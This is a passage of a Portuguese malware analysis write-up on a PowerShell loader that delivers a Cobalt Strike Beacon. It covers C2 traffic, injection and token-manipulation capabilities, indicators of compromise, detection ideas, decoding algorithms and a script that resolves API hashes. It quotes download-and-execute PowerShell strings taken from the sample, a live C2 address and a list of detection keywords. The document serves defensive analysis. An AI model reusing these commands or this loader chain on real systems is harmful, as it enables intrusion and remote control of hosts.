HttpOpenRequestA(GET, /push)
        ↓
Recebimento de tarefas
```

O envio de dados utiliza:

```text
HttpOpenRequestA(POST, /submit.php)
        ↓
Content-Type: application/octet-stream
        ↓
HttpSendRequestA
```

A configuração também indica que a metadata é:

1. processada pelo Beacon;
2. codificada em Base64;
3. inserida no header `Cookie`.

As conclusões desta seção são derivadas da configuração decodificada e do fluxo estático das rotinas WinINet.

![5be34d5a635abc3755b5842080a2ebb6.png](/images/cobalt-strike-loader/5be34d5a635abc3755b5842080a2ebb6.png)
<center><i>Figura 20 — Inicialização da sessão HTTP com valores obtidos da configuração.</i></center>

![dbd8403882f76d8e4557e7193298aec7.png](/images/cobalt-strike-loader/dbd8403882f76d8e4557e7193298aec7.png)
<center><i>Figura 21 — Construção das requisições HTTP do Beacon.</i></center>

---

## 15. Capacidades do Stage 2

### 15.1 Injeção de processos

Foram identificadas APIs como:

```text
VirtualAllocEx
WriteProcessMemory
VirtualProtectEx
CreateRemoteThread
GetThreadContext
SetThreadContext
ResumeThread
RtlCreateUserThread
NtQueueApcThread
NtMapViewOfSection
```

Essas funções demonstram suporte a múltiplas técnicas de injeção e execução em processos.

A presença das rotinas não identifica, por análise estática, qual processo seria escolhido como alvo.

---

### 15.2 Manipulação de tokens

Foram identificadas referências a:

```text
OpenProcessToken
OpenThreadToken
AdjustTokenPrivileges
DuplicateTokenEx
LogonUserA
ImpersonateNamedPipeClient
ImpersonateLoggedOnUser
CreateProcessWithTokenW
CreateProcessWithLogonW
CreateProcessAsUserA
```

Também existem referências a:

```text
SeDebugPrivilege
SeCreateTokenPrivilege
SeAssignPrimaryTokenPrivilege
```

As funcionalidades permitem:

* habilitação de privilégios;
* duplicação de tokens;
* impersonação;
* execução com credenciais alternativas.

---

### 15.3 Serviços

O Beacon contém rotinas para:

```text
OpenSCManager
CreateService
StartService
QueryServiceStatus
DeleteService
CloseServiceHandle
```

Essas capacidades são compatíveis com:

* execução remota;
* movimentação lateral;
* criação temporária de serviço;
* execução de payload por serviço.

A análise não confirmou que o fluxo inicial cria um serviço persistente.

---

### 15.4 Execução PowerShell e strings

No Stage 2, foram identificados templates como `powershell -nop -exec bypass -EncodedCommand "%s"` e `IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/')`

Essas strings demonstram suporte à execução PowerShell após o recebimento de tarefas.

Também foram encontradas algumas APIs relacionadas a privilégio:
![e387266b9fbb7cbe1901475410c2b5f3.png](/images/cobalt-strike-loader/e387266b9fbb7cbe1901475410c2b5f3.png)
<center><i>Figura 22 - Strings relacionadas às APIs de privilégio</i></center>

---

### 15.5 SHA-256

O Stage 2 contém uma implementação completa do algoritmo SHA-256:

* constantes padrão;
* inicialização do contexto;
* processamento de blocos;
* finalização;
* vetores de teste conhecidos.

A presença da implementação não comprova, isoladamente, que ela seja responsável pela criptografia do canal C2 ou pela decodificação da configuração.

---

## 16. Persistência

Não foram encontrados indicadores estáticos fortes de persistência automática por `Run / RunOnce`, `Scheduled Tasks`, `WMI, Startup Folder`, `COM Hijacking`, `DLL Search Order Hijacking`

As funcionalidades de serviços podem ser acionadas por tasking, mas sua presença no binário não demonstra que um serviço seja criado durante a infecção inicial.

Conclusão:

> **Persistência automática não confirmada no escopo da análise.**

---

## 17. Técnicas anti-analysis

| Técnica                           | Evidência                                    | Avaliação                       |
| --------------------------------- | -------------------------------------------- | ------------------------------- |
| Payload Base64                    | String no PowerShell                         | Confirmada                      |
| Execução em memória               | File mapping e delegate                      | Confirmada                      |
| Decoder ROR do Stage 1            | Loop no shellcode                            | Confirmada                      |
| Decoder ROR do Stage 2            | Loop na DLL intermediária                    | Confirmada                      |
| API hashing                       | CRC32 sobre exports                          | Confirmada                      |
| Configuração ofuscada             | XOR `0x2E`                                   | Confirmada                      |
| Reflective loading                | `_ReflectiveLoader@4`                        | Confirmada                      |
| Encerramento do processo pai      | Toolhelp, `OpenProcess` e `TerminateProcess` | Confirmada                      |


APIs como `IsDebuggerPresent`, `DebugBreak`, `RaiseException`, `SetUnhandledExceptionFilter` aparecem no Stage 2, mas seus usos são compatíveis com componentes do runtime MSVC. Elas não devem ser classificadas automaticamente como anti-debugging customizado.

---

## 18. Indicadores de comprometimento

### 18.1 Infraestrutura

| Tipo        | Valor                                |
| ----------- | ------------------------------------ |
| IP          | `31.41.244.192`                      |
| Porta       | `80`                                 |
| URL inicial | `hxxp://31.41.244[.]192:80/645gkdkfgd` |
| GET URI     | `/push`                              |
| POST URI    | `/submit.php`                        |

### 18.2 User-Agent

```text
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)
```

### 18.3 Artefatos

| Artefato        | Hash                                                               |
| --------------- | ------------------------------------------------------------------ |
| Stage 1 SHA-256 | `a41dde7d2733cf4f8c057a188fb5bce82f085b7972aeaa23b5ddb0ef71c1988d` |
| Stage 2 SHA-256 | `6318e322c478adefa9b4a16166c3d05201153b5cbd1f2e21327300abdeb5a757` |

### 18.4 Outros indicadores

```text
9K8J7HG65F467j
a32big.dll
beacon.dll
_ReflectiveLoader@4
%windir%\syswow64\rundll32.exe
%windir%\sysnative\rundll32.exe
```

---

## 19. Oportunidades de detecção

### 19.1 PowerShell

Monitorar linhas de comando contendo combinações como:

```text
powershell.exe
-nop
-w hidden
IEX
Net.WebClient
DownloadString
```

### 19.2 Memória

Monitorar processos PowerShell que:

* resolvem `CryptStringToBinaryA`;
* criam file mappings executáveis;
* mapeiam regiões com escrita e execução;
* convertem ponteiros em delegates;
* transferem execução para memória privada.

### 19.3 Rede

Monitorar:

```text
31.41.244.192:80
GET /push
POST /submit.php
```

O User-Agent antigo e incomum também pode ser utilizado como indicador complementar.

### 19.4 Comportamento

Correlacionar:

```text
PowerShell
→ DownloadString
→ execução em memória
→ file mapping executável
→ encerramento do processo pai
→ reflective loading
→ comunicação WinINet
```

---

## 20. Conclusão

A cadeia analisada utiliza PowerShell como mecanismo inicial de download e execução em memória.

O loader evita declarações P/Invoke explícitas por meio de reflexão .NET, processa um payload Base64 com `CryptStringToBinaryA` e grava o shellcode resultante em uma região de memória executável.

O shellcode inicial recupera uma DLL x86 por meio de um decoder baseado em rotação de bits. Essa DLL atua como loader intermediário, resolve APIs por CRC32, implementa mecanismos de controle da árvore de processos e extrai um segundo PE embutido.

O segundo estágio foi identificado como um Cobalt Strike Beacon x86. Sua configuração foi recuperada por meio de XOR `0x2E` e revelou comunicação HTTP com:

```text
31.41.244.192:80
GET /push
POST /submit.php
```

O Beacon implementa capacidades de:

* execução remota;
* injeção em processos;
* manipulação de tokens;
* execução PowerShell;
* operações com serviços;
* comunicação HTTP C2.

A análise não confirmou persistência automática nem a execução efetiva de todas as capacidades presentes. Essas funcionalidades devem ser interpretadas como recursos disponíveis ao operador após o estabelecimento da comunicação com o C2.

---

## Apêndice A — Arquivos produzidos

```text
loader.ps1
stage0_shellcode.bin
stage1_decoded.bin
stage2_decoded.bin
config_decoded.bin
```

---

## Apêndice B — Resumo dos algoritmos

```text
Stage 0:
CryptStringToBinaryA / base64

Stage 1:
ROR8 por byte
Contagem = chave incremental & 7

Stage 2:
ROR8 por byte
Contagem = (1 + índice) & 7
Decodificação para nova região RWX
Execução pelo endereço-base da região recuperada

Configuração:
XOR por byte com 0x2E

API hashing:
CRC32 refletido
Polinômio 0xEDB88320
Seed 0xFFFFFFFF
Sem XOR final observado
```

---

## Apêndice C — Fluxo resumido

```text
powershell.exe
    |
    | DownloadString + IEX
    v
loader.ps1
    |
    | CryptStringToBinaryA
    v
stage0_shellcode.bin
    |
    | ROR decoder
    v
stage1_decoded.bin
    |
    | API hashing / controle de processos / ROR
    v
stage2_decoded.bin
    |
    | ReflectiveLoader / XOR config
    v
Cobalt Strike Beacon
    |
    | HTTP
    v
31.41.244.192:80
```

---

## Apêndice D — Mapeamento completo dos hashes de API
{: #appendix-d }

[↩ Voltar ao ponto da referência](#ref-appendix-d){: .appendix-backlink role="doc-backlink" }

### `kernel32.dll`

| Hash CRC32   | API resolvida                           |
| ------------ | --------------------------------------- |
| `0x007F73EF` | `CreateRemoteThread`                    |
| `0x0394BD0E` | `GetModuleFileNameW`                    |
| `0x05C2D077` | `FlushFileBuffers`                      |
| `0x06EE1D63` | `HeapDestroy`                           |
| `0x083851BD` | `ReadProcessMemory`                     |
| `0x0AB29637` | `CopyFileW`                             |
| `0x0AE688F8` | `Thread32Next`                          |
| `0x0B635934` | `PeekNamedPipe`                         |
| `0x1038158B` | `SetFilePointer`                        |
| `0x1704C494` | `FreeEnvironmentStringsA`               |
| `0x17A15D18` | `WriteConsoleW`                         |
| `0x17F91E53` | `LeaveCriticalSection`                  |
| `0x19D17DB2` | `VirtualAllocEx`                        |
| `0x1C812D1E` | `InitializeCriticalSectionAndSpinCount` |
| `0x1DE0986E` | `DuplicateHandle`                       |
| `0x1FA744BA` | `WaitForSingleObject`                   |
| `0x20200D0B` | `OutputDebugStringW`                    |
| `0x207889B5` | `GetVersionExA`                         |
| `0x20D8AEB4` | `OpenProcess`                           |
| `0x21600F2E` | `MoveFileA`                             |
| `0x22041FCB` | `SetLastError`                          |
| `0x231ACDD9` | `GetFileType`                           |
| `0x24279339` | `CompareStringA`                        |
| `0x25227614` | `GetStdHandle`                          |
| `0x2582BE79` | `SetEnvironmentVariableW`               |
| `0x2597DC70` | `FreeLibrary`                           |
| `0x264DFB6B` | `GetCommandLineW`                       |
| `0x27D40965` | `FindClose`                             |
| `0x27FA4E5D` | `ReadConsoleA`                          |
| `0x288801BB` | `GetACP`                                |
| `0x296DC854` | `GetFullPathNameW`                      |
| `0x2A3CA097` | `SetStdHandle`                          |
| `0x2D1AC948` | `GetLastError`                          |
| `0x2DC506A1` | `DecodePointer`                         |
| `0x2E1B9C17` | `TlsGetValue`                           |
| `0x2F79E55B` | `GetCurrentProcess`                     |
| `0x310D1257` | `Sleep`                                 |
| `0x32AA51AB` | `GetConsoleCP`                          |
| `0x32AC0A22` | `VirtualFree`                           |
| `0x3316A9ED` | `WriteFile`                             |
| `0x347BE5AB` | `SetUnhandledExceptionFilter`           |
| `0x34EAF723` | `LoadLibraryW`                          |
| `0x35F56674` | `AreFileApisANSI`                       |
| `0x36142A31` | `FindFirstFileA`                        |
| `0x3683E000` | `GetProcAddress`                        |
| `0x38623B1C` | `GetCurrentDirectoryA`                  |
| `0x38CE4F40` | `RemoveDirectoryW`                      |
| `0x3B4B56B2` | `GetFileAttributesW`                    |
| `0x3E0C4789` | `CreateToolhelp32Snapshot`              |
| `0x3E19300A` | `GetEnvironmentStringsW`                |
| `0x43949840` | `Process32NextW`                        |
| `0x43F291E1` | `IsProcessorFeaturePresent`             |
| `0x4505FC28` | `SetHandleCount`                        |
| `0x457C3B09` | `GetComputerNameA`                      |
| `0x47AB7900` | `OpenThread`                            |
| `0x49C0EE61` | `WaitNamedPipeW`                        |
| `0x4BE46D93` | `CreateFileMappingA`                    |
| `0x4DF59A83` | `GetModuleHandleExA`                    |
| `0x4E799A8F` | `GetModuleHandleA`                      |
| `0x4E7D2056` | `HeapCreate`                            |
| `0x4EACF3C1` | `GetOEMCP`                              |
| `0x4F091756` | `HeapFree`                              |
| `0x4F6CEA0B` | `CloseHandle`                           |
| `0x5199F0B9` | `UpdateProcThreadAttribute`             |
| `0x521D346A` | `GetStartupInfoA`                       |
| `0x52A94FBD` | `QueryPerformanceCounter`               |
| `0x54BF4072` | `TerminateProcess`                      |
| `0x5764C7D0` | `MapViewOfFile`                         |
| `0x57AE26E9` | `CreateProcessA`                        |
| `0x59454763` | `ExpandEnvironmentStringsA`             |
| `0x5C79E9FF` | `LCMapStringA`                          |
| `0x5CA76EFC` | `DeleteCriticalSection`                 |
| `0x5DEA8D31` | `CreatePipe`                            |
| `0x5E1016D6` | `CreateFileW`                           |
| `0x629DCE31` | `SetCurrentDirectoryW`                  |
| `0x64EFD1D2` | `LoadLibraryExA`                        |
| `0x657F1A76` | `WideCharToMultiByte`                   |
| `0x667AF71D` | `SetFilePointerEx`                      |
| `0x69D3CE38` | `GetStringTypeA`                        |
| `0x6ADB82C6` | `CreateNamedPipeW`                      |
| `0x6E649434` | `DeleteFileA`                           |
| `0x6F95F94F` | `CreateThread`                          |
| `0x6FFCBEB5` | `GetConsoleOutputCP`                    |
| `0x71139260` | `GetSystemTimeAsFileTime`               |
| `0x7207819C` | `GetCurrentThreadId`                    |
| `0x7AB4C783` | `GetLocaleInfoW`                        |
| `0x7BC9086A` | `IsDebuggerPresent`                     |
| `0x7C6586FA` | `SetErrorMode`                          |
| `0x7D65BB85` | `ConnectNamedPipe`                      |
| `0x7E0C63E6` | `FindNextFileW`                         |
| `0x7E68FFB3` | `Process32FirstW`                       |
| `0x7EB24952` | `CreateDirectoryA`                      |
| `0x7EFDC07A` | `ProcessIdToSessionId`                  |
| `0x7F509D1E` | `ExitThread`                            |
| `0x81C17B2A` | `EncodePointer`                         |
| `0x84221D18` | `Wow64SetThreadContext`                 |
| `0x8A66FC03` | `CreateDirectoryW`                      |
| `0x8AD8D6B7` | `FindNextFileA`                         |
| `0x8D0EE1C6` | `MultiByteToWideChar`                   |
| `0x8E6072D2` | `GetLocaleInfoA`                        |
| `0x8EE3D934` | `GetLogicalDrives`                      |
| `0x903B6483` | `LoadLibraryExW`                        |
| `0x96497B60` | `SetCurrentDirectoryA`                  |
| `0x976BF8A9` | `FileTimeToSystemTime`                  |
| `0x985383D9` | `SystemTimeToTzSpecificLocalTime`       |
| `0x9AB02165` | `DeleteFileW`                           |
| `0x9B61463E` | `GetThreadContext`                      |
| `0x9D077B69` | `GetStringTypeW`                        |
| `0x9E0F3797` | `CreateNamedPipeA`                      |
| `0xA124E28D` | `HeapAlloc`                             |
| `0xA23ED800` | `GetConsoleMode`                        |
| `0xA2E7FBEC` | `VirtualProtectEx`                      |
| `0xA37A93B8` | `CreateProcessW`                        |
| `0xA4BDE607` | `GetTickCount`                          |
| `0xA6BDEBA2` | `SetNamedPipeHandleState`               |
| `0xA6C9813B` | `GetStartupInfoW`                       |
| `0xA7765701` | `HeapReAlloc`                           |
| `0xA8AD5CAE` | `LCMapStringW`                          |
| `0xA9773427` | `SetThreadContext`                      |
| `0xAAC4A387` | `CreateFileA`                           |
| `0xAD91F232` | `ExpandEnvironmentStringsW`             |
| `0xAF201BD3` | `DebugBreak`                            |
| `0xB0A768D1` | `WriteProcessMemory`                    |
| `0xB1A88E58` | `GetComputerNameW`                      |
| `0xB61FD3CB` | `VirtualQuery`                          |
| `0xB6346F01` | `Wow64GetThreadContext`                 |
| `0xB81509F1` | `TlsFree`                               |
| `0xB9212FD2` | `GetModuleHandleExW`                    |
| `0xBAAD2FDE` | `GetModuleHandleW`                      |
| `0xBD0B6607` | `DeleteProcThreadAttributeList`         |
| `0xBD145B30` | `WaitNamedPipeA`                        |
| `0xBF09BD92` | `GetProcessHeap`                        |
| `0xBF30D8C2` | `CreateFileMappingW`                    |
| `0xC03E4272` | `LoadLibraryA`                          |
| `0xC2C09F60` | `FindFirstFileW`                        |
| `0xC6E54950` | `UnmapViewOfFile`                       |
| `0xC78D4146` | `ResumeThread`                          |
| `0xCACD855B` | `GetEnvironmentStringsA`                |
| `0xCC1AFA11` | `RemoveDirectoryA`                      |
| `0xCCB68E4D` | `GetCurrentDirectoryW`                  |
| `0xCF9FE3E3` | `GetFileAttributesA`                    |
| `0xD06FE642` | `DisconnectNamedPipe`                   |
| `0xD0F32668` | `CompareStringW`                        |
| `0xD0FE5166` | `EnterCriticalSection`                  |
| `0xD1560B28` | `SetEnvironmentVariableA`               |
| `0xD1AFCBF4` | `IsWow64Process`                        |
| `0xD2994E3A` | `GetCommandLineA`                       |
| `0xD32EFB0C` | `ReadConsoleW`                          |
| `0xD4AC3CE4` | `GetVersionExW`                         |
| `0xD4F4B85A` | `OutputDebugStringA`                    |
| `0xD5B4BA7F` | `MoveFileW`                             |
| `0xD6EAA3C6` | `TlsSetValue`                           |
| `0xD8092904` | `GetCPInfo`                             |
| `0xD9830E5A` | `Process32First`                        |
| `0xD9A3A95F` | `InitializeProcThreadAttributeList`     |
| `0xDAE64EA5` | `SetEndOfFile`                          |
| `0xDAEF6833` | `ExitProcess`                           |
| `0xDC74CEEB` | `Thread32First`                         |
| `0xDDB97D05` | `GetFullPathNameA`                      |
| `0xE24BEC1C` | `GetCurrentProcessId`                   |
| `0xE375E849` | `WriteConsoleA`                         |
| `0xE3A7BFC3` | `IsValidCodePage`                       |
| `0xE3D071C5` | `FreeEnvironmentStringsW`               |
| `0xE44BC2DF` | `GetLocalTime`                          |
| `0xE619A249` | `GetCurrentThread`                      |
| `0xE961C8D8` | `TlsAlloc`                              |
| `0xECAC0FD0` | `UnhandledExceptionFilter`              |
| `0xEFF990D0` | `VirtualProtect`                        |
| `0xF5E7F2F4` | `HeapSize`                              |
| `0xF631F2B5` | `VirtualAlloc`                          |
| `0xF6A3FC2F` | `ReadFile`                              |
| `0xF740085F` | `GetModuleFileNameA`                    |
| `0xFD712A3F` | `Process32Next`                         |
| `0xFE662366` | `CopyFileA`                             |

### `ws2_32.dll`

| Hash CRC32   | API resolvida     |
| ------------ | ----------------- |
| `0x053BE917` | `htons`           |
| `0x2AC874D1` | `ioctlsocket`     |
| `0x34EB427D` | `WSASocketA`      |
| `0x3DDB9802` | `listen`          |
| `0x4CDF12CB` | `accept`          |
| `0x5129B6C4` | `ntohl`           |
| `0x588CC532` | `send`            |
| `0x5A392888` | `closesocket`     |
| `0x5F0A036C` | `WSAStartup`      |
| `0x6067C93F` | `WSAIoctl`        |
| `0x6A5D213D` | `shutdown`        |
| `0x6AC070A3` | `__WSAFDIsSet`    |
| `0x71CC6743` | `WSACleanup`      |
| `0x8833E4E2` | `htonl`           |
| `0x8B3006E0` | `connect`         |
| `0xA627AD52` | `recv`            |
| `0xAFF54180` | `WSAGetLastError` |
| `0xB40D153F` | `select`          |
| `0xB9330CAC` | `bind`            |
| `0xC03FF72C` | `WSASocketW`      |
| `0xC88ABA5D` | `gethostbyname`   |
| `0xDC21BB31` | `ntohs`           |
| `0xFA1A9744` | `socket`          |

### `wininet.dll`

| Hash CRC32   | API resolvida                |
| ------------ | ---------------------------- |
| `0x00FF4E09` | `HttpSendRequestA`           |
| `0x099E7708` | `HttpQueryInfoW`             |
| `0x14786735` | `InternetErrorDlg`           |
| `0x1AE6E2DB` | `InternetCloseHandle`        |
| `0x1D68C08E` | `HttpAddRequestHeadersW`     |
| `0x25E957C2` | `InternetOpenA`              |
| `0x3AB06AA7` | `InternetQueryOptionA`       |
| `0x3DB05A0B` | `InternetConnectA`           |
| `0x4171F640` | `InternetSetOptionW`         |
| `0x4515EC5F` | `InternetSetStatusCallbackA` |
| `0x4F5642C5` | `HttpOpenRequestW`           |
| `0x933F670A` | `InternetReadFile`           |
| `0xB1C1590E` | `InternetSetStatusCallbackW` |
| `0xB5A54311` | `InternetSetOptionA`         |
| `0xBB82F794` | `HttpOpenRequestA`           |
| `0xC964EF5A` | `InternetConnectW`           |
| `0xCE64DFF6` | `InternetQueryOptionW`       |
| `0xD13DE293` | `InternetOpenW`              |
| `0xE5068E1B` | `InternetQueryDataAvailable` |
| `0xE9BC75DF` | `HttpAddRequestHeadersA`     |
| `0xF42BFB58` | `HttpSendRequestW`           |
| `0xFD4AC259` | `HttpQueryInfoA`             |

### `advapi32.dll`

| Hash CRC32   | API resolvida     |
| ------------ | ----------------- |
| `0x267823E2` | `CreateServiceA`   |
| `0x3995935B` | `QueryServiceStatus` |
| `0x793811AD` | `OpenSCManagerA`   |
| `0x7E4B6E4A` | `StartServiceW`    |
| `0x8A9FDB1B` | `StartServiceA`    |
| `0x8DECA4FC` | `OpenSCManagerW`   |
| `0x8F8A3020` | `CloseServiceHandle` |
| `0xD2AC96B3` | `CreateServiceW`   |
| `0xD646D2A5` | `DeleteService`    |


---

## Apêndice E — Script completo de resolução dos hashes

```python
from pathlib import Path
from collections import defaultdict
import pefile

kernel32_hashes = [
    0x35F56674, 0x4F6CEA0B, 0x24279339, 0xD0F32668, 0x7D65BB85, 0xFE662366, 0xAB29637, 0x7EB24952, 0x8A66FC03, 0xAAC4A387, 0x5E1016D6, 0x4BE46D93, 0xBF30D8C2, 0x9E0F3797, 0x6ADB82C6, 0x5DEA8D31, 0x57AE26E9, 0xA37A93B8, 0x7F73EF, 0x6F95F94F, 0x3E0C4789, 0xAF201BD3, 0x2DC506A1, 0x5CA76EFC, 0x6E649434, 0x9AB02165, 0xBD0B6607, 0xD06FE642, 0x1DE0986E, 0x81C17B2A, 0xD0FE5166, 0xDAEF6833, 0x7F509D1E, 0x59454763, 0xAD91F232, 0x976BF8A9, 0x27D40965, 0x36142A31, 0xC2C09F60, 0x8AD8D6B7, 0x7E0C63E6, 0x5C2D077, 0x1704C494, 0xE3D071C5, 0x2597DC70, 0x288801BB, 0xD8092904, 0xD2994E3A, 0x264DFB6B, 0x457C3B09, 0xB1A88E58, 0x32AA51AB, 0xA23ED800, 0x6FFCBEB5, 0x38623B1C, 0xCCB68E4D, 0x2F79E55B, 0xE24BEC1C, 0xE619A249, 0x7207819C, 0xCACD855B, 0x3E19300A, 0xCF9FE3E3, 0x3B4B56B2, 0x231ACDD9, 0xDDB97D05, 0x296DC854, 0x2D1AC948, 0xE44BC2DF, 0x8E6072D2, 0x7AB4C783, 0x8EE3D934, 0xF740085F, 0x394BD0E, 0x4E799A8F, 0xBAAD2FDE, 0x4DF59A83, 0xB9212FD2, 0x4EACF3C1, 0x3683E000, 0xBF09BD92, 0x521D346A, 0xA6C9813B, 0x25227614, 0x69D3CE38, 0x9D077B69, 0x71139260, 0x9B61463E, 0xA4BDE607, 0x207889B5, 0xD4AC3CE4, 0xA124E28D, 0x4E7D2056, 0x6EE1D63, 0x4F091756, 0xA7765701, 0xF5E7F2F4, 0x1C812D1E, 0xD9A3A95F, 0x7BC9086A, 0x43F291E1, 0xE3A7BFC3, 0xD1AFCBF4, 0x5C79E9FF, 0xA8AD5CAE, 0x17F91E53, 0xC03E4272, 0x34EAF723, 0x64EFD1D2, 0x903B6483, 0x5764C7D0, 0x21600F2E, 0xD5B4BA7F, 0x8D0EE1C6, 0x20D8AEB4, 0x47AB7900, 0xD4F4B85A, 0x20200D0B, 0xB635934, 0xD9830E5A, 0xFD712A3F, 0x7E68FFB3, 0x43949840, 0x7EFDC07A, 0x52A94FBD, 0x27FA4E5D, 0xD32EFB0C, 0xF6A3FC2F, 0x83851BD, 0xCC1AFA11, 0x38CE4F40, 0xC78D4146, 0x96497B60, 0x629DCE31, 0xDAE64EA5, 0xD1560B28, 0x2582BE79, 0x7C6586FA, 0x1038158B, 0x667AF71D, 0x4505FC28, 0x22041FCB, 0xA6BDEBA2, 0x2A3CA097, 0xA9773427, 0x347BE5AB, 0x310D1257, 0x985383D9, 0x54BF4072, 0xDC74CEEB, 0xAE688F8, 0xE961C8D8, 0xB81509F1, 0x2E1B9C17, 0xD6EAA3C6, 0xECAC0FD0, 0xC6E54950, 0x5199F0B9, 0xF631F2B5, 0x19D17DB2, 0x32AC0A22, 0xEFF990D0, 0xA2E7FBEC, 0xB61FD3CB, 0x1FA744BA, 0xBD145B30, 0x49C0EE61, 0x657F1A76, 0xB6346F01, 0x84221D18, 0xE375E849, 0x17A15D18, 0x3316A9ED, 0xB0A768D1
]
 
ws2_32_hashes = [
    0x71CC6743, 0xAFF54180, 0x6067C93F, 0x34EB427D, 0xC03FF72C, 0x5F0A036C, 0x6AC070A3, 0x4CDF12CB, 0xB9330CAC, 0x5A392888, 0x8B3006E0, 0xC88ABA5D, 0x8833E4E2, 0x53BE917, 0x2AC874D1, 0x3DDB9802, 0x5129B6C4, 0xDC21BB31, 0xA627AD52, 0xB40D153F, 0x588CC532, 0x6A5D213D, 0xFA1A9744
]
 
wininet_hashes = [
    0xE9BC75DF, 0x1D68C08E, 0xBB82F794, 0x4F5642C5, 0xFD4AC259, 0x99E7708, 0xFF4E09, 0xF42BFB58, 0x1AE6E2DB, 0x3DB05A0B, 0xC964EF5A, 0x25E957C2, 0xD13DE293, 0xE5068E1B, 0x3AB06AA7, 0xCE64DFF6, 0x933F670A, 0xB5A54311, 0x4171F640, 0x4515EC5F, 0xB1C1590E, 0x14786735
]

advapi32_hashes = [
    0x8F8A3020, 0x267823E2, 0xD2AC96B3, 0xD646D2A5, 0x793811AD, 0x8DECA4FC, 0x3995935B, 0x8A9FDB1B, 0x7E4B6E4A
]

def malware_crc32_name(name: bytes) -> int:
    crc = 0xFFFFFFFF

    for byte in name:
        crc ^= byte

        for _ in range(8):
            if crc & 1:
                crc = (
                    (crc >> 1) ^
                    0xEDB88320
                )
            else:
                crc >>= 1

            crc &= 0xFFFFFFFF

    return crc


def build_export_hash_index(
    dll_path: Path
):
    pe = pefile.PE(str(dll_path))
    index = defaultdict(list)

    for export in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        if not export.name:
            continue

        export_name = export.name.decode(
            "ascii",
            errors="replace"
        )

        export_hash = malware_crc32_name(
            export.name
        )

        index[export_hash].append(
            export_name
        )

    return index


def resolve_hashes(
    dll_name: str,
    dll_path: Path,
    hashes: list[int]
):
    export_index = build_export_hash_index(
        dll_path
    )

    results = []

    for target_hash in hashes:
        matches = export_index.get(
            target_hash & 0xFFFFFFFF,
            []
        )
        if matches:
            for api_name in matches:
                results.append({
                    "dll": dll_name,
                    "hash": (
                        target_hash &
                        0xFFFFFFFF
                    ),
                    "api": api_name,
                })
        else:
            results.append({
                "dll": dll_name,
                "hash": (
                    target_hash &
                    0xFFFFFFFF
                ),
                "api": "UNRESOLVED",
            })

    return results


all_results = []

"""
If you are on Linux, you can get the respective DLLs at
https://winbindex.m417z.com/?file=<DLL_Name>.dll 
and change the paths below to run this script 
"""

jobs = {
    "kernel32.dll": {
        "path": Path(
            r"C:\Windows\SysWOW64\kernel32.dll"
        ),
        "hashes": kernel32_hashes,
    },
    "ws2_32.dll": {
        "path": Path(
            r"C:\Windows\SysWOW64\ws2_32.dll"
        ),
        "hashes": ws2_32_hashes,
    },
    "wininet.dll": {
        "path": Path(
            r"C:\Windows\SysWOW64\wininet.dll"
        ),
        "hashes": wininet_hashes,
    },
    "advapi32.dll": {
        "path": Path(
            r"C:\Windows\SysWOW64\advapi32.dll"
        ),
        "hashes": advapi32_hashes,
    },
}

for dll_name, job in jobs.items():
    results = resolve_hashes(
        dll_name,
        job["path"],
        job["hashes"]
    )

    all_results.extend(results)

    print(f"\n--- {dll_name} ---")

    for result in results:
        print(
            f"0x{result['hash']:08X}"
            f" -> {result['api']}"
        )

```

## Saiba mais

1) **DFIR Report (2023)**: <a href="https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/#:~:text=http://31.41.244.192:80/645gkdkfgd'" target="_blank" rel="noopener noreferrer">From ScreenConnect to Hive Ransomware in 61 hours</a>

2) **eSentire Threat Intelligence Malware Analysis (2023):** <a href="https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign#:~:text=what%20about%20the%20PowerShell" target="_blank" rel="noopener noreferrer">Resident Campaign</a>

